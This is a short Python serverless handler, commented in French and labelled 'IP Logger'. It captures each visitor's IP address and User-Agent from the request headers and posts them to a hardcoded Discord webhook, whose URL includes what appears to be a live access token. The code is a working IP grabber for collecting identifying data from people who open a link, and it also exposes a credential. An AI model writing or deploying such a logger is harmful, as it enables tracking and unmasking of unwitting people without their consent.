import json
import requests

# Webhook Discord
WEBHOOK_URL = "https://discord.com/api/webhooks/1338289805330485269/HWNiUL4_apZL2n3c9qJxxieUQiqKKOgsVROl3Lsgl9QcCwVoWsAcxy1ndbLKSnCrPoEw"

def handler(event, context):
    try:
        # Récupérer l'IP et l'User-Agent
        headers = event.get('headers', {})
        client_ip = headers.get('x-forwarded-for', 'IP not found')
        user_agent = headers.get('user-agent', 'User-Agent not found')

        # Envoyer les infos sur le webhook Discord
        requests.post(WEBHOOK_URL, json={
            "username": "IP Logger",
            "content": f"**Nouvelle IP détectée !**\n- **IP:** {client_ip}\n- **User-Agent:** {user_agent}"
        })

        # Réponse HTTP pour l'utilisateur
        return {
            "statusCode": 200,
            "headers": {"Content-Type": "application/json"},
            "body": json.dumps({"message": "IP logged successfully."})
        }

    except Exception as e:
        return {
            "statusCode": 500,
            "headers": {"Content-Type": "application/json"},
            "body": json.dumps({"error": str(e)})
        }
